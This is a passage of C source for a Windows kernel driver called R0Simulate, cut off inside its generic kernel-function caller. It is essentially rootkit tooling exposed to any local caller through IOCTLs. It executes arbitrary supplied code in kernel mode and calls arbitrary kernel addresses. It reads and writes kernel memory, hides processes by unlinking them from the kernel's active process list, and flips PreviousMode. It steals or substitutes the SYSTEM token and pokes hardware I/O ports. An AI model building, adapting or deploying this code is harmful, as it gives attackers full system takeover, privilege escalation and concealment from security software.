#define _CRT_SECURE_NO_WARNINGS
#include <ntifs.h>
#include <ntddk.h>
#include <ntstatus.h>
#include <ntimage.h>

#pragma warning(disable:4100 4189 4211)

#define PROCESS_QUERY_INFORMATION 0x0400

NTKERNELAPI NTSTATUS ZwOpenProcessToken(
    HANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    PHANDLE TokenHandle
);

NTKERNELAPI NTSTATUS MmCopyVirtualMemory(
    PEPROCESS SourceProcess,
    PVOID SourceAddress,
    PEPROCESS TargetProcess,
    PVOID TargetAddress,
    SIZE_T BufferSize,
    KPROCESSOR_MODE PreviousMode,
    PSIZE_T ReturnSize
);

NTKERNELAPI NTSTATUS ZwProtectVirtualMemory(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    SIZE_T *RegionSize,
    ULONG NewProtect,
    ULONG *OldProtect
);

NTKERNELAPI NTSTATUS ZwQueryInformationToken(
    HANDLE TokenHandle,
    TOKEN_INFORMATION_CLASS TokenInformationClass,
    PVOID TokenInformation,
    ULONG TokenInformationLength,
    PULONG ReturnLength
);

NTKERNELAPI NTSTATUS ZwSetInformationToken(
    HANDLE TokenHandle,
    TOKEN_INFORMATION_CLASS TokenInformationClass,
    PVOID TokenInformation,
    ULONG TokenInformationLength
);

NTKERNELAPI NTSTATUS ZwSetInformationProcess(
    HANDLE ProcessHandle,
    ULONG ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength
);

NTSYSCALLAPI NTSTATUS NTAPI ZwQuerySystemInformation(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

// ------------------ Device & IOCTL Definitions ------------------
#define DEVICE_NAME     L"\\Device\\R0Simulate"
#define SYM_LINK_NAME   L"\\DosDevices\\R0Simulate"

#define IOCTL_R0SIMULATE_EXEC_INSTRUCTION           CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_R0SIMULATE_CALL_KERNEL_API            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_R0SIMULATE_KERNEL_PROCESS_HIDING      CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_R0SIMULATE_PREVIOUS_MODE_SWITCH       CTL_CODE(FILE_DEVICE_UNKNOWN, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_R0SIMULATE_KERNEL_OPEN_HANDLE         CTL_CODE(FILE_DEVICE_UNKNOWN, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_R0SIMULATE_KERNEL_MEMORY_ACCESS       CTL_CODE(FILE_DEVICE_UNKNOWN, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_R0SIMULATE_GET_SYSTEM_TOKEN           CTL_CODE(FILE_DEVICE_UNKNOWN, 0x806, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_R0SIMULATE_SET_INTERNAL_VARS          CTL_CODE(FILE_DEVICE_UNKNOWN, 0x807, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_R0SIMULATE_GET_KERNEL_FUNCTION        CTL_CODE(FILE_DEVICE_UNKNOWN, 0x808, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_R0SIMULATE_IO                         CTL_CODE(FILE_DEVICE_UNKNOWN, 0x809, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define R0SIMULATE_FLAG_USE_ADDRESS  0x00000001

#define R0SPMS_MODE_KERNEL   0x00
#define R0SPMS_MODE_USER     0x01

#define R0SKPH_OP_ADD      0x10
#define R0SKPH_OP_REMOVE   0x11
#define R0SKPH_OP_LIST     0x12

#define R0SKMA_OP_READ     0
#define R0SKMA_OP_WRITE    1

#define ProcessAccessToken 9

#define R0SIMULATE_VAR_OP_GET   0x01
#define R0SIMULATE_VAR_OP_SET   0x02
#define R0SIMULATE_VAR_OP_LIST  0x03

#define R0SIMULATE_VAR_PREVIOUS_MODE_OFFSET         1
#define R0SIMULATE_VAR_ACTIVE_PROCESS_LINKS_OFFSET  2
#define R0SIMULATE_VAR_PRIMARY_TOKEN_FROZEN_OFFSET  3
#define R0SIMULATE_VAR_USE_PARSED_MODE              4

// ----- I/O Port Operation Codes -----
#define R0SIO_READ_BYTE     0x01
#define R0SIO_READ_WORD     0x02
#define R0SIO_READ_DWORD    0x03
#define R0SIO_WRITE_BYTE    0x11
#define R0SIO_WRITE_WORD    0x12
#define R0SIO_WRITE_DWORD   0x13

// ------------------ Structure Definitions ------------------
typedef struct _SYSTEM_MODULE_ENTRY {
    HANDLE Section;
    PVOID MappedBase;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    UCHAR FullPathName[256];
} SYSTEM_MODULE_ENTRY, *PSYSTEM_MODULE_ENTRY;

typedef struct _SYSTEM_MODULE_INFORMATION {
    ULONG Count;
    SYSTEM_MODULE_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

typedef struct _EXEC_INSTRUCTION_INPUT {
    ULONG   InstructionSize;
    UCHAR   Instruction[1];
} EXEC_INSTRUCTION_INPUT, *PEXEC_INSTRUCTION_INPUT;

typedef struct _EXEC_INSTRUCTION_OUTPUT {
    UINT64  ReturnValue;
    NTSTATUS Status;
} EXEC_INSTRUCTION_OUTPUT, *PEXEC_INSTRUCTION_OUTPUT;

typedef struct _CALL_KERNEL_API_INPUT {
    ULONG   ApiNameLength;
    ULONG   ArgumentCount;
    ULONG   Flags;
    UINT64  Arguments[16];
    WCHAR   ApiName[1];
} CALL_KERNEL_API_INPUT, *PCALL_KERNEL_API_INPUT;

typedef struct _CALL_KERNEL_API_OUTPUT {
    UINT64  ReturnValue;
    NTSTATUS Status;
} CALL_KERNEL_API_OUTPUT, *PCALL_KERNEL_API_OUTPUT;

typedef struct _PREVIOUS_MODE_SWITCH_INPUT {
    UCHAR   Mode;
    UCHAR   ViewOnly;
    UCHAR   Reserved[6];
} PREVIOUS_MODE_SWITCH_INPUT, *PPREVIOUS_MODE_SWITCH_INPUT;

typedef struct _PREVIOUS_MODE_SWITCH_OUTPUT {
    NTSTATUS Status;
    UCHAR    OldMode;
    UCHAR    NewMode;
} PREVIOUS_MODE_SWITCH_OUTPUT, *PPREVIOUS_MODE_SWITCH_OUTPUT;

typedef struct _PROCESS_HIDING_INPUT {
    UINT64  Address;
    ULONG   Length;
    UCHAR   Operation;
    UCHAR   Reserved[3];
} PROCESS_HIDING_INPUT, *PPROCESS_HIDING_INPUT;

typedef struct _HIDDEN_PROCESS_ENTRY {
    LIST_ENTRY ListEntry;
    HANDLE     ProcessId;
    PEPROCESS  EProcess;
} HIDDEN_PROCESS_ENTRY, *PHIDDEN_PROCESS_ENTRY;

typedef struct _KERNEL_MEMORY_ACCESS_INPUT {
    UINT64  Address;
    ULONG   Offset;
    ULONG   Length;
    UCHAR   Operation;
    UCHAR   Reserved[3];
    UCHAR   Data[1];
} KERNEL_MEMORY_ACCESS_INPUT, *PKERNEL_MEMORY_ACCESS_INPUT;

typedef struct _GET_SYSTEM_TOKEN_INPUT {
    UCHAR   ReplaceToken;
    UCHAR   Reserved[7];
} GET_SYSTEM_TOKEN_INPUT, *PGET_SYSTEM_TOKEN_INPUT;

typedef struct _GET_SYSTEM_TOKEN_OUTPUT {
    NTSTATUS Status;
    HANDLE   TokenHandle;
} GET_SYSTEM_TOKEN_OUTPUT, *PGET_SYSTEM_TOKEN_OUTPUT;

typedef struct _SET_INTERNAL_VAR_INPUT {
    ULONG   Operation;
    ULONG   VariableId;
    UINT64  Value;
} SET_INTERNAL_VAR_INPUT, *PSET_INTERNAL_VAR_INPUT;

typedef struct _VAR_INFO {
    ULONG   Id;
    ULONG   Size;
    UINT64  Value;
    WCHAR   Name[64];
} VAR_INFO, *PVAR_INFO;

typedef struct _GET_KERNEL_FUNCTION_INPUT {
    ULONG   NameLength;
    WCHAR   Name[1];
} GET_KERNEL_FUNCTION_INPUT, *PGET_KERNEL_FUNCTION_INPUT;

typedef struct _KERNEL_FUNCTION_ENTRY {
    UINT64  Address;
    WCHAR   Name[64];
} KERNEL_FUNCTION_ENTRY, *PKERNEL_FUNCTION_ENTRY;

typedef struct _R0S_IO_INPUT {
    ULONG   Operation;
    ULONG   Port;
    ULONG   Value;
} R0S_IO_INPUT, *PR0S_IO_INPUT;

typedef struct _R0S_IO_OUTPUT {
    ULONG   Value;
    NTSTATUS Status;
} R0S_IO_OUTPUT, *PR0S_IO_OUTPUT;

typedef struct _FUNCTION_ENTRY {
    LIST_ENTRY ListEntry;
    UNICODE_STRING Name;
    PVOID Address;
} FUNCTION_ENTRY, *PFUNCTION_ENTRY;

// ------------------ Global Variables ------------------
PDEVICE_OBJECT g_DeviceObject = NULL;
UNICODE_STRING g_SymLinkName;

static LIST_ENTRY g_HiddenListHead;
static KSPIN_LOCK g_HiddenListLock;

static ULONG g_PreviousModeOffset = 0;
static ULONG g_ActiveProcessLinksOffset = 0;
static ULONG g_PrimaryTokenFrozenOffset = 0;
static ULONG g_UseParsedMode = 0;

static LIST_ENTRY g_FunctionTableHead;
static KSPIN_LOCK g_FunctionTableLock;
static BOOLEAN g_FunctionTableBuilt = FALSE;

typedef struct _VAR_DESC {
    ULONG  Id;
    ULONG  Size;
    PVOID  Address;
    WCHAR  Name[64];
} VAR_DESC;

static VAR_DESC g_VarDesc[] = {
    { 1, sizeof(ULONG), &g_PreviousModeOffset,         L"g_PreviousModeOffset" },
    { 2, sizeof(ULONG), &g_ActiveProcessLinksOffset,   L"g_ActiveProcessLinksOffset" },
    { 3, sizeof(ULONG), &g_PrimaryTokenFrozenOffset,   L"g_PrimaryTokenFrozenOffset" },
    { 4, sizeof(ULONG), &g_UseParsedMode,              L"g_UseParsedMode" },
    { 0, 0, NULL, L"" }
};

// ------------------ Function Prototypes ------------------
NTSTATUS DriverEntry(PDRIVER_OBJECT, PUNICODE_STRING);
VOID DriverUnload(PDRIVER_OBJECT);
NTSTATUS DriverCreateClose(PDEVICE_OBJECT, PIRP);
NTSTATUS DriverDeviceControl(PDEVICE_OBJECT, PIRP);

NTSTATUS InitDynamicOffsets(VOID);
NTSTATUS ExecuteInstruction(PEPROCESS, PVOID, ULONG, PUINT64);
NTSTATUS CallKernelApiInternal(PVOID, ULONG, UINT64*, PVOID, ULONG, PUINT64);
NTSTATUS PreviousModeSwitch(PVOID, ULONG, PVOID, ULONG, PULONG_PTR);
NTSTATUS ProcessHiding(PVOID, ULONG, PVOID, ULONG, PULONG_PTR);
NTSTATUS KernelMemoryAccess(PVOID, ULONG, PVOID, ULONG, PULONG_PTR);
NTSTATUS GetSystemToken(PVOID, ULONG, PVOID, ULONG, PULONG_PTR);
NTSTATUS SetInternalVariables(PVOID, ULONG, PVOID, ULONG, PULONG_PTR);
NTSTATUS LazyBuildFunctionTable(VOID);
NTSTATUS GetKernelFunction(PVOID, ULONG, PVOID, ULONG, PULONG_PTR);
NTSTATUS IoPortOperation(PVOID, ULONG, PVOID, ULONG, PULONG_PTR);

BOOLEAN SafeReadMemory(PVOID Address, PVOID Buffer, SIZE_T Size);

// ------------------ Implementation ------------------
BOOLEAN SafeReadMemory(PVOID Address, PVOID Buffer, SIZE_T Size) {
    __try {
        RtlCopyMemory(Buffer, Address, Size);
        return TRUE;
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        return FALSE;
    }
}

NTSTATUS InitDynamicOffsets(VOID) {
    NTSTATUS status = STATUS_SUCCESS;
    UNICODE_STRING us;
    PVOID pExGetPrevMode, pPsGetPid;
    UCHAR *pCode;
    USHORT offset;
    PEPROCESS pSystem = PsInitialSystemProcess;

    RtlInitUnicodeString(&us, L"ExGetPreviousMode");
    pExGetPrevMode = MmGetSystemRoutineAddress(&us);
    if (!pExGetPrevMode) {
        DbgPrint("[R0S] Failed to get ExGetPreviousMode address\n");
        return STATUS_NOT_FOUND;
    }
    pCode = (UCHAR*)pExGetPrevMode;
    __try {
        offset = *(USHORT*)(pCode + 0x0C);
        g_PreviousModeOffset = offset;
        DbgPrint("[R0S] g_PreviousModeOffset = 0x%X\n", g_PreviousModeOffset);
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        status = GetExceptionCode();
        DbgPrint("[R0S] Exception getting g_PreviousModeOffset: 0x%08X\n", status);
        return status;
    }

    RtlInitUnicodeString(&us, L"PsGetProcessId");
    pPsGetPid = MmGetSystemRoutineAddress(&us);
    if (!pPsGetPid) {
        DbgPrint("[R0S] Failed to get PsGetProcessId address\n");
        return STATUS_NOT_FOUND;
    }
    pCode = (UCHAR*)pPsGetPid;
    __try {
        offset = *(USHORT*)(pCode + 0x03);
        g_ActiveProcessLinksOffset = offset + 0x08;
        DbgPrint("[R0S] g_ActiveProcessLinksOffset = 0x%X\n", g_ActiveProcessLinksOffset);
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        status = GetExceptionCode();
        DbgPrint("[R0S] Exception getting g_ActiveProcessLinksOffset: 0x%08X\n", status);
        return status;
    }

    if (pSystem) {
        ULONG searchLen = 0x600;
        UCHAR* base = (UCHAR*)pSystem;
        __try {
            for (ULONG i = 0; i < searchLen - 1; i++) {
                if (base[i] == 0xD0 && base[i+1] == 0x00) {
                    g_PrimaryTokenFrozenOffset = i;
                    break;
                }
            }
        } __except(EXCEPTION_EXECUTE_HANDLER) {
            status = GetExceptionCode();
            DbgPrint("[R0S] Exception getting g_PrimaryTokenFrozenOffset: 0x%08X\n", status);
            return status;
        }
    }

    if (g_PrimaryTokenFrozenOffset == 0) {
        DbgPrint("[R0S] g_PrimaryTokenFrozenOffset not found\n");
        return STATUS_NOT_FOUND;
    }
    DbgPrint("[R0S] g_PrimaryTokenFrozenOffset = 0x%X\n", g_PrimaryTokenFrozenOffset);

    return STATUS_SUCCESS;
}

NTSTATUS LazyBuildFunctionTable(VOID) {
    NTSTATUS status;
    ULONG bufferSize = 0;
    PSYSTEM_MODULE_INFORMATION pModuleInfo = NULL;
    PVOID buffer = NULL;
    ULONG totalExports = 0;

    DbgPrint("[R0S] Lazy building function table...\n");

    status = ZwQuerySystemInformation(11, NULL, 0, &bufferSize);
    if (status != STATUS_INFO_LENGTH_MISMATCH) {
        DbgPrint("[R0S] ZwQuerySystemInformation size failed: 0x%08X\n", status);
        return STATUS_UNSUCCESSFUL;
    }

    buffer = ExAllocatePoolWithTag(NonPagedPool, bufferSize, 'TBL0');
    if (!buffer) {
        DbgPrint("[R0S] Failed to allocate module buffer\n");
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    status = ZwQuerySystemInformation(11, buffer, bufferSize, NULL);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[R0S] ZwQuerySystemInformation failed: 0x%08X\n", status);
        ExFreePoolWithTag(buffer, 'TBL0');
        return status;
    }

    pModuleInfo = (PSYSTEM_MODULE_INFORMATION)buffer;
    ULONG count = pModuleInfo->Count;
    DbgPrint("[R0S] Found %lu kernel modules\n", count);

    for (ULONG i = 0; i < count; i++) {
        PSYSTEM_MODULE_ENTRY pEntry = &pModuleInfo->Module[i];
        PVOID base = pEntry->ImageBase;
        ULONG size = pEntry->ImageSize;
        if (!base || size == 0) continue;

        IMAGE_DOS_HEADER dos;
        if (!SafeReadMemory(base, &dos, sizeof(dos))) continue;
        if (dos.e_magic != IMAGE_DOS_SIGNATURE) continue;

        ULONG e_lfanew = dos.e_lfanew;
        if (e_lfanew + sizeof(IMAGE_NT_HEADERS64) > size) continue;

        IMAGE_NT_HEADERS64 nt;
        if (!SafeReadMemory((PUCHAR)base + e_lfanew, &nt, sizeof(nt))) continue;
        if (nt.Signature != IMAGE_NT_SIGNATURE) continue;

        IMAGE_DATA_DIRECTORY exportDir = nt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
        if (exportDir.VirtualAddress == 0 || exportDir.Size == 0) continue;
        if (exportDir.VirtualAddress + exportDir.Size > size) continue;

        IMAGE_EXPORT_DIRECTORY export;
        if (!SafeReadMemory((PUCHAR)base + exportDir.VirtualAddress, &export, sizeof(export))) continue;
        if (export.NumberOfNames == 0) continue;

        if (export.AddressOfNames + export.NumberOfNames * 4 > size ||
            export.AddressOfFunctions + export.NumberOfFunctions * 4 > size ||
            export.AddressOfNameOrdinals + export.NumberOfNames * 2 > size) {
            continue;
        }

        for (ULONG j = 0; j < export.NumberOfNames; j++) {
            ULONG nameRVA;
            if (!SafeReadMemory((PUCHAR)base + export.AddressOfNames + j * 4, &nameRVA, sizeof(nameRVA))) break;
            if (nameRVA >= size) continue;

            char funcName[128] = {0};
            for (int k = 0; k < 127; k++) {
                char ch;
                if (!SafeReadMemory((PUCHAR)base + nameRVA + k, &ch, 1)) break;
                if (ch == 0) {
                    funcName[k] = 0;
                    break;
                }
                funcName[k] = ch;
            }
            funcName[127] = 0;

            USHORT ordinal;
            if (!SafeReadMemory((PUCHAR)base + export.AddressOfNameOrdinals + j * 2, &ordinal, sizeof(ordinal))) break;
            ULONG funcRVA;
            if (!SafeReadMemory((PUCHAR)base + export.AddressOfFunctions + ordinal * 4, &funcRVA, sizeof(funcRVA))) break;

            PVOID funcAddr = (PUCHAR)base + funcRVA;

            PFUNCTION_ENTRY pNode = (PFUNCTION_ENTRY)ExAllocatePoolWithTag(NonPagedPool, sizeof(FUNCTION_ENTRY), 'FENT');
            if (!pNode) continue;

            ULONG len = (ULONG)strlen(funcName);
            WCHAR* wname = (WCHAR*)ExAllocatePoolWithTag(NonPagedPool, (len + 1) * sizeof(WCHAR), 'FNAM');
            if (!wname) {
                ExFreePoolWithTag(pNode, 'FENT');
                continue;
            }
            for (ULONG k = 0; k < len; k++) {
                wname[k] = (WCHAR)funcName[k];
            }
            wname[len] = L'\0';
            RtlInitUnicodeString(&pNode->Name, wname);
            pNode->Address = funcAddr;
            InsertHeadList(&g_FunctionTableHead, &pNode->ListEntry);
            totalExports++;
        }
    }

    DbgPrint("[R0S] Function table built, total exports: %lu\n", totalExports);
    ExFreePoolWithTag(buffer, 'TBL0');
    return STATUS_SUCCESS;
}

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    NTSTATUS status;

    status = InitDynamicOffsets();
    if (!NT_SUCCESS(status)) {
        DbgPrint("[R0S] InitDynamicOffsets failed: 0x%08X\n", status);
        return status;
    }

    PDEVICE_OBJECT deviceObject;
    UNICODE_STRING devName;

    RtlInitUnicodeString(&devName, DEVICE_NAME);
    RtlInitUnicodeString(&g_SymLinkName, SYM_LINK_NAME);

    status = IoCreateDevice(DriverObject, 0, &devName, FILE_DEVICE_UNKNOWN,
                            0, FALSE, &deviceObject);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[R0S] IoCreateDevice failed: 0x%08X\n", status);
        return status;
    }

    g_DeviceObject = deviceObject;
    deviceObject->Flags |= DO_BUFFERED_IO;

    status = IoCreateSymbolicLink(&g_SymLinkName, &devName);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[R0S] IoCreateSymbolicLink failed: 0x%08X\n", status);
        IoDeleteDevice(deviceObject);
        return status;
    }

    DriverObject->MajorFunction[IRP_MJ_CREATE] = DriverCreateClose;
    DriverObject->MajorFunction[IRP_MJ_CLOSE]  = DriverCreateClose;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DriverDeviceControl;
    DriverObject->DriverUnload = DriverUnload;

    InitializeListHead(&g_HiddenListHead);
    KeInitializeSpinLock(&g_HiddenListLock);

    InitializeListHead(&g_FunctionTableHead);
    KeInitializeSpinLock(&g_FunctionTableLock);
    g_FunctionTableBuilt = FALSE;

    deviceObject->Flags &= ~DO_DEVICE_INITIALIZING;
    DbgPrint("[R0S] Driver loaded successfully (lazy function table)\n");
    return STATUS_SUCCESS;
}

VOID DriverUnload(PDRIVER_OBJECT DriverObject) {
    PHIDDEN_PROCESS_ENTRY pEntry, pNext;
    KIRQL oldIrql;

    DbgPrint("[R0S] Driver unloading...\n");

    KeAcquireSpinLock(&g_HiddenListLock, &oldIrql);
    __try {
        for (PLIST_ENTRY pList = g_HiddenListHead.Flink; pList != &g_HiddenListHead; pList = (PLIST_ENTRY)pNext) {
            pEntry = CONTAINING_RECORD(pList, HIDDEN_PROCESS_ENTRY, ListEntry);
            pNext = (PHIDDEN_PROCESS_ENTRY)pList->Flink;
            RemoveEntryList(&pEntry->ListEntry);
            KeReleaseSpinLock(&g_HiddenListLock, oldIrql);

            PEPROCESS pProc = pEntry->EProcess;
            if (pProc) {
                PLIST_ENTRY pLink = (PLIST_ENTRY)((PCHAR)pProc + g_ActiveProcessLinksOffset);
                PEPROCESS pSys = PsInitialSystemProcess;
                PLIST_ENTRY pSysLink = (PLIST_ENTRY)((PCHAR)pSys + g_ActiveProcessLinksOffset);
                InsertHeadList(pSysLink, pLink);
                ObDereferenceObject(pProc);
            }
            ExFreePoolWithTag(pEntry, 'HIDE');
            KeAcquireSpinLock(&g_HiddenListLock, &oldIrql);
        }
    } __finally {
        KeReleaseSpinLock(&g_HiddenListLock, oldIrql);
    }

    PFUNCTION_ENTRY pFunc, pFuncNext;
    KeAcquireSpinLock(&g_FunctionTableLock, &oldIrql);
    for (PLIST_ENTRY pList = g_FunctionTableHead.Flink; pList != &g_FunctionTableHead; pList = pList->Flink) {
        pFunc = CONTAINING_RECORD(pList, FUNCTION_ENTRY, ListEntry);
        pFuncNext = (PFUNCTION_ENTRY)pList->Flink;
        RemoveEntryList(&pFunc->ListEntry);
        KeReleaseSpinLock(&g_FunctionTableLock, oldIrql);
        if (pFunc->Name.Buffer) ExFreePoolWithTag(pFunc->Name.Buffer, 'FNAM');
        ExFreePoolWithTag(pFunc, 'FENT');
        KeAcquireSpinLock(&g_FunctionTableLock, &oldIrql);
    }
    KeReleaseSpinLock(&g_FunctionTableLock, oldIrql);

    if (g_DeviceObject) {
        IoDeleteSymbolicLink(&g_SymLinkName);
        IoDeleteDevice(g_DeviceObject);
    }
    DbgPrint("[R0S] Driver unloaded\n");
}

NTSTATUS DriverCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    UNREFERENCED_PARAMETER(DeviceObject);
    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

NTSTATUS ExecuteInstruction(PEPROCESS TargetProcess, PVOID InstructionCode,
                            ULONG InstructionSize, PUINT64 ReturnValue) {
    NTSTATUS status = STATUS_SUCCESS;
    PVOID execMem = NULL;
    UINT64 result = 0;

    execMem = ExAllocatePoolWithTag(NonPagedPoolExecute, InstructionSize, '0SR0');
    if (!execMem) return STATUS_INSUFFICIENT_RESOURCES;
    RtlCopyMemory(execMem, InstructionCode, InstructionSize);

    __try {
        KAPC_STATE apcState;
        KeStackAttachProcess((PRKPROCESS)TargetProcess, &apcState);
        __try {
            result = ((UINT64(*)())execMem)();
        } __except(EXCEPTION_EXECUTE_HANDLER) {
            status = GetExceptionCode();
        }
        KeUnstackDetachProcess(&apcState);
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        status = GetExceptionCode();
    }

    if (ReturnValue) *ReturnValue = result;
    ExFreePoolWithTag(execMem, '0SR0');
    return status;
}

static NTSTATUS CallKernelApiInternal(
    PVOID ApiAddress,
    ULONG Argc,
    UINT64 *Args,
    PVOID OutputBuffer,
    ULONG OutputSize,
    UINT64 *ReturnValue)
{
    NTSTATUS status = STATUS_SUCCESS;
    UINT64 ret = 0;
    PVOID stackMem = NULL;
    SIZE_T stackSize = 0;

    UNREFERENCED_PARAMETER(OutputBuffer);
    UNREFERENCED_PARAMETER(OutputSize);

    if (Argc > 16) return STATUS_NOT_SUPPORTED;

    if (Argc > 4) {
        stackSize = (Argc - 4) * sizeof(UINT64);
        stackMem = ExAllocatePoolWithTag(NonPagedPool, stackSize, '0SR0');
        if (!stackMem) return STATUS_INSUFFICIENT_RESOURCES;
        RtlCopyMemory(stackMem, &Args[4], stackSize);
    }

    __try {
        switch (Argc) {
            case 0: ret = ((UINT64(*)())ApiAddress)(); break;
            case 1: ret = ((UINT64(*)(UINT64))ApiAddress)(Args[0]); break;
            case 2: ret = ((UINT64(*)(UINT64, UINT64))ApiAddress)(Args[0], Args[1]); break;
            case 3: ret = ((UINT64(*)(UINT64, UINT64, UINT64))ApiAddress)(Args[0], Args[1], Args[2]); break;
            case 4: ret = ((UINT64(*)(UINT64, UINT64, UINT64, UINT64))ApiAddress)(Args[0], Args[1], Args[2], Args[3]); break;
            case 5: ret = ((UINT64(*)(UINT64, UINT64, UINT64, UINT64, UINT64))ApiAddress)(Args[0], Args[1], Args[2], Args[3], ((UINT64*)stackMem)[0]); break;
            case 6: ret = ((UINT64(*)(UINT64, UINT64, UINT64, UINT64, UINT64, UINT64))ApiAddress)(Args[0], Args[1], Args[2], Args[3], ((UINT64*)stackMem)[0], ((UINT64*)stackMem)[1]); break;
            case 7: ret = ((UINT64(*)(UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64))ApiAddress)(Args[0], Args[1], Args[2], Args[3], ((UINT64*)stackMem)[0], ((UINT64*)stackMem)[1], ((UINT64*)stackMem)[2]); break;
            case 8: ret = ((UINT64(*)(UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64))ApiAddress)(Args[0], Args[1], Args[2], Args[3], ((UINT64*)stackMem)[0], ((UINT64*)stackMem)[1], ((UINT64*)stackMem)[2], ((UINT64*)stackMem)[3]); break;
            case 9: ret = ((UINT64(*)(UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64))ApiAddress)(Args[0], Args[1], Args[2], Args[3], ((UINT64*)stackMem)[0], ((UINT64*)stackMem)[1], ((UINT64*)stackMem)[2], ((UINT64*)stackMem)[3], ((UINT64*)stackMem)[4]); break;
            case 10: ret = ((UINT64(*)(UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64))ApiAddress)(Args[0], Args[1], Args[2], Args[3], ((UINT64*)stackMem)[0], ((UINT64*)stackMem)[1], ((UINT64*)stackMem)[2], ((UINT64*)stackMem)[3], ((UINT64*)stackMem)[4], ((UINT64*)stackMem)[5]); break;
            case 11: ret = ((UINT64(*)(UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64))ApiAddress)(Args[0], Args[1], Args[2], Args[3], ((UINT64*)stackMem)[0], ((UINT64*)stackMem)[1], ((UINT64*)stackMem)[2], ((UINT64*)stackMem)[3], ((UINT64*)stackMem)[4], ((UINT64*)stackMem)[5], ((UINT64*)stackMem)[6]); break;
            case 12: ret = ((UINT64(*)(UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64))ApiAddress)(Args[0], Args[1], Args[2], Args[3], ((UINT64*)stackMem)[0], ((UINT64*)stackMem)[1], ((UINT64*)stackMem)[2], ((UINT64*)stackMem)[3], ((UINT64*)stackMem)[4], ((UINT64*)stackMem)[5], ((UINT64*)stackMem)[6], ((UINT64*)stackMem)[7]); break;
            case 13: ret = ((UINT64(*)(UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64))ApiAddress)(Args[0], Args[1], Args[2], Args[3], ((UINT64*)stackMem)[0], ((UINT64*)stackMem)[1], ((UINT64*)stackMem)[2], ((UINT64*)stackMem)[3], ((UINT64*)stackMem)[4], ((UINT64*)stackMem)[5], ((UINT64*)stackMem)[6], ((UINT64*)stackMem)[7], ((UINT64*)stackMem)[8]); break;
            case 14: ret = ((UINT64(*)(UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64))ApiAddress)(Args[0], Args[1], Args[2], Args[3], ((UINT64*)stackMem)[0], ((UINT64*)stackMem)[1], ((UINT64*)stackMem)[2], ((UINT64*)stackMem)[3], ((UINT64*)stackMem)[4], ((UINT64*)stackMem)[5], ((UINT64*)stackMem)[6], ((UINT64*)stackMem)[7], ((UINT64*)stackMem)[8], ((UINT64*)stackMem)[9]); break;
            case 15: ret = ((UINT64(*)(UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64))ApiAddress)(Args[0], Args[1], Args[2], Args[3], ((UINT64*)stackMem)[0], ((UINT64*)stackMem)[1], ((UINT64*)stackMem)[2], ((UINT64*)stackMem)[3], ((UINT64*)stackMem)[4], ((UINT64*)stackMem)[5], ((UINT64*)stackMem)[6], ((UINT64*)stackMem)[7], ((UINT64*)stackMem)[8], ((UINT64*)stackMem)[9], ((UINT64*)stackMem)[10]); break;
            case 16: ret = ((UINT64(*)(UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64))ApiAddress)(Args[0], Args[1], Args[2], Args[3], ((UINT64*)stackMem)[0], ((UINT64*)stackMem)[1], ((UINT64*)stackMem)[2], ((UINT64*)stackMem)[3], ((UINT64*)stackMem)[4], ((UINT64*)stackMem)[5], ((UINT64*)stackMem)[6], ((UINT64*)stackMem)[7], ((UINT64*)stackMem)[8], ((UINT64*)stackMem)[9], ((UINT64*)stackMem)[10], ((UINT64*)stackMem)[11]); break;
